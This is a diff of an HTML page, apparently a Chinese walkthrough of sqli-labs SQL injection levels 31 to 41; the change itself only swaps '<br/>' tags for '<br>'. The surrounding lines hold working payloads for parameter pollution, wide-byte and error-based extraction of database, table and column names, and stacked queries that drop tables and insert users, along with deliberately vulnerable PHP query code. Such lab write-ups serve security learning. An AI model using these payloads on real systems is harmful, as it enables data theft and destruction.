@@ -296,7 +296,7 @@
 
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">explode(separator,string,limit) 函数把字符串打散为数组。</span><br><span class="line">separator 必需。规定在哪里分割字符串。</span><br><span class="line">string 必需。要分割的字符串。</span><br><span class="line">limit 可选。规定所返回的数组元素的数目。可能的值：</span><br><span class="line">    大于 0 - 返回包含最多 limit 个元素的数组</span><br><span class="line">    小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组</span><br><span class="line">    0 - 返回包含一个元素的数组</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<br/>
+<br>
 
 <p>对于<code>login.php?id=1&amp;id=2</code> apache(php)会解析最后一个参数，tomcat(jsp)会解析第一个参数，第一个<code>id</code>会经过<code>whitelist()</code>和<code>java_implimentation()</code></p>
 <p><code>whitelist()</code>作用是传入的参数必须是一位及以上的数字</p>
@@ -311,41 +311,41 @@
 <h3 id="31-参数污染"><a href="#31-参数污染" class="headerlink" title="31 参数污染"></a>31 参数污染</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p><code>?id=12&amp;id=-1&quot;) union select 1,(select password from users limit 0,1),(&quot;3</code></p>
-<br/>
+<br>
 
-<h3 id="32-宽字节注入"><a href="#32-宽字节注入" class="headerlink" title="32 宽字节注入"></a>32 宽字节注入</h3><br/>
+<h3 id="32-宽字节注入"><a href="#32-宽字节注入" class="headerlink" title="32 宽字节注入"></a>32 宽字节注入</h3><br>
 
 <p><code>?id=1%df%27%20union%20select%201,2,3%20--+</code></p>
 <p><code>?id=0%df%27%20union%20select%201,database(),3%20--+</code></p>
 <p><code>?id=0%df%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),3%20--+</code></p>
 <p>在查字段名的时候需要把<code>&#39;users&#39;</code>转成16进制，16进制的表名不需要引号 <code>0x7573657273</code></p>
 <p><code>?id=0%df%27%20union%20select%201,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=0x7573657273%20limit%200,1),3%20--+</code></p>
-<br/>
+<br>
 
 <h3 id="33-宽字节注入"><a href="#33-宽字节注入" class="headerlink" title="33 宽字节注入"></a>33 宽字节注入</h3><p>和32一模一样</p>
 <p><code>?id=1%df%27%20and%201=1%20--+</code></p>
-<br/>
+<br>
 
 <h3 id="34-宽字节注入-POST"><a href="#34-宽字节注入-POST" class="headerlink" title="34 宽字节注入(POST)"></a>34 宽字节注入(POST)</h3><p>过滤方式和上面的一样，可以使用burp直接传，不过POST传入数据时会进行url编码，</p>
 <p>在输入 <code>1%df or 1=1#</code>后抓包可以看到前面的<code>%df</code>变成了<code>%25df</code></p>
 <p><code>uname=1%25df%27+or+1%3D1%23&amp;passwd=aa&amp;submit=Submit</code>修改一下即可</p>
-<br/>
+<br>
 
-<br/>
+<br>
 
 <h3 id="35-宽字节注入"><a href="#35-宽字节注入" class="headerlink" title="35 宽字节注入"></a>35 宽字节注入</h3><p>和32差不多 只不过这里是字符型，不需要<code>&#39;</code>闭合</p>
 <p><code>?id=0 union select 1,database(),3</code></p>
-<br/>
+<br>
 
-<br/>
+<br>
 
 <h3 id="36-宽字节注入"><a href="#36-宽字节注入" class="headerlink" title="36 宽字节注入"></a>36 宽字节注入</h3><p>和前面一样</p>
 <p><code>?id=0%df%27%20union%20select%201,2,3--+</code></p>
 <p>?id=0%df%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)–+</p>
-<br/>
+<br>
 
 <h3 id="37-宽字节注入-POST"><a href="#37-宽字节注入-POST" class="headerlink" title="37 宽字节注入(POST)"></a>37 宽字节注入(POST)</h3><p>和34一样</p>
-<br/>
+<br>
 
 <h3 id="38-堆叠注入"><a href="#38-堆叠注入" class="headerlink" title="38 堆叠注入"></a>38 堆叠注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* store first result set */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = mysqli_store_result(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span> = mysqli_fetch_row(<span class="variable">$result</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">            printf(<span class="string">&quot;Your Username is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            printf(<span class="string">&quot;Your Password is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            mysqli_free_result($result);</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">/* print divider */</span></span><br><span class="line">    <span class="keyword">if</span> (mysqli_more_results(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="comment">//printf(&quot;-----------------\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//while (mysqli_next_result($con1));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysqli_error(<span class="variable">$con1</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* close connection */</span></span><br><span class="line">mysqli_close(<span class="variable">$con1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -356,18 +356,18 @@
 <p><code>?id=1&#39;;drop table test; --+</code>删除<code>test</code>表</p>
 <p>在<code>uers</code>表添加数据</p>
 <p><code>?id=1&#39;;insert into users(id,username,password) values(&#39;25&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
-<br/>
+<br>
 
 <h3 id="39-堆叠注入"><a href="#39-堆叠注入" class="headerlink" title="39 堆叠注入"></a>39 堆叠注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>数字型 不需要闭合</p>
 <p><code>?id=1;insert into users(id,username,password) values(&#39;26&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;) --+</code></p>
-<br/>
+<br>
 
 <h3 id="40-堆叠注入"><a href="#40-堆叠注入" class="headerlink" title="40 堆叠注入"></a>40 堆叠注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p><code>?id=1&#39;) ; insert into users(id,username,password) values(&#39;40&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
-<br/>
+<br>
 
 <h3 id="41-堆叠注入"><a href="#41-堆叠注入" class="headerlink" title="41 堆叠注入"></a>41 堆叠注入</h3><p><code>?id=2-1 --+</code>和<code>?id=1 --+</code>返回结果一样</p>
 <p>可以判断是数字型，和39一样</p>
